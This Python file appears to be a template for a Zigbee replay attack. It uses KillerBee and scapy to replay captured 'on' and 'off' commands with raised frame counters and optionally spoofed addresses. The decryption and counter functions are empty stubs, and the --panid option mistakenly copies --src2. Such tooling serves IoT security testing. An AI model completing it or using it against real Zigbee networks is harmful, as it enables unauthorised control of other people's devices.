# Usage description for docopt
"""
ReplayZCL<YourAttack>

Usage: 
    zcl_replay_<yourattack>.py [--channel <channel>] [--increment <increment>] [--key <key>] [--trace <pcapfile>] [--sniff ] [--src <src>] [--src2 <src2>] [--panid <panid>]

Options: 
    -h, --help                 Show this help menu.

    -c, --channel <channel>    Channel to inject [default: 15].
    -i, --increment <increment>Counter increment [default: 10].
    -k, --key <key>            Network key.
    -t, --trace <FILE>         Pcap file to use for replay packets
    --sniff                    Only sniff the network without injecting packets 
    --src src                  Replace the injected packet layer 3 source (eg. 0xa962)
    --src2 src2                Replace the injected packet layer 2 source (eg. 0xa962)
    --panid panid              Replace the injected packet PAN ID source (e.g. 0x1962) 
"""

import sys
import os
os.chdir(os.path.realpath(os.path.dirname(sys.argv[0])))
sys.path.append("../replay")

from replay_packet import ReplayZigbeePacket

from killerbee.scapy_extensions import *
from scapy.layers.dot15d4 import *
from scapy.layers.zigbee import *
from scapy.utils import *
from docopt import docopt, DocoptExit

def recognize_decrypt_packet(pkt, key_net):
    """
    Return True, Decrypted_Packet, [frame counters] if packet is recognized
    Otherwise return False, None, [-1, -1]
    """
    pass


def set_module_counters(aps_counter, zcl_counter, decrypted_pkt, module_args):
    """
    Sets the parameters needed for the exploit : counters and command bytes. 
    """
    pass

class ReplayCommand:
    def __init__(self):
        self.options = {
            'channel': {
                'Current Settings': '15',
                'Require': True,
                'Description': 'Channel to send [default: 15].'
            },
            'increment': {
                'Current Settings': '10',
                'Require': True,
                'Description': 'Increment to frame counters [default: 10].'
            },
            'default_fc': {
                'Current Settings': '200',
                'Require': True,
                'Description': 'Default frame counter set when previous \
                    is not known [default: 200].'
            },
            'key': {
                'Current Settings': 'f247868f650fa30e2f0d5e1abc341179', #TODO: set network key
                'Require': True,
                'Description': 'Key used to encrypt/decrypt packets'
            },
            'keep_addr': {
                'Current Settings': True, #If False, set new source/destinations for the packet
                'Require': True,
                'Description': 'Keep same addresses for replayed packet'
            },
            'src': {
                'Current Settings': None,
                'Require': False,
                'Description': 'New short address of source (layer 3).'
            },
            'dst': {
                'Current Settings': None,
                'Require': False,
                'Description': 'New short address of destination (layer 3).'
            },
            'src2': {
                'Current Settings': None,
                'Require': False,
                'Description': 'New short address of source (layer 2).'
            },
            'dst2': {
                'Current Settings': None,
                'Require': False,
                'Description': 'New short address of destination (layer 2).'
            },
            'panid': {
                'Current Settings': None,
                'Require': False,
                'Description': 'New PAN ID of the Zigbee Network.'
            },
            'trace': {
                'Current Settings': "packets.pcapng", #TODO : set filename of pcap containing the packets to replay. Pcap file must be located in the same folder.
                'Require': True,
                'Description': 'Filename of the .pcap of the packet to replay.'
            },
            'inject': {
                'Current Settings': True,
                'Require': True,
                'Description': 'Inject packet or not. If false, only sniff counters [default: True].'
            },
            'use': {
                'Current Settings': "['command1', 'command2']", #TODO : describe the module commands
                'Require': True,
                'Description': 'Describe use of the module for the replayer.'
            }
        }

                # Update args
        global args
        if args['--increment'] is not None:
            self.options['increment']['Current Settings'] = int(args['--increment'])
        if args['--src'] is not None:
            self.options['src']['Current Settings'] = int(args['--src'], 16)
        if args['--src2'] is not None:
            self.options['src2']['Current Settings'] = int(args['--src2'], 16)
        if args['--panid'] is not None:
            self.options['src2']['Current Settings'] = int(args['--src2'], 16)
        for i in ['src', 'src2', 'dst', 'dst2', 'panid']:
            if self.options[i]['Current Settings'] is not None:
                self.options['keep_addr']['Current Settings'] = False
                break  

    def run(self):
        """
        Run the replay with the the current settings 
        
        Usage: run [-h]

        Options:
            -h, --help  print this help menu
        """
        conf.dot15d4_protocol = "zigbee"
        
        # Initialize injection packet
        r_pkts = rdpcap(self.options['trace']['Current Settings'])

        # Initialize replayer
        replayer = ReplayZigbeePacket()
        
        #TODO: Add commands to inject
        replay_pkt = r_pkts[0]
        module_args = {
            "foo": "bar",
        }
        replayer.add_replay_command(replay_pkt, "off", set_module_counters, module_args)

        replay_pkt = r_pkts[1]
        module_args = {
            "foo": "\x01",
        }
        replayer.add_replay_command(replay_pkt, 'on', set_module_counters, module_args)
        
        
        # Run replayer        
        replayer.run(self.options, replay_pkt, recognize_decrypt_packet, args['--sniff'])

if __name__ == '__main__':  
    
    banner = """
******* Zigbee injection module *******
            
            
* Starting injection
    """

    print(banner)
    version = 0.1    
    global args
    args = docopt(__doc__, version=version)
    replayer = ReplayCommand()
    replayer.run()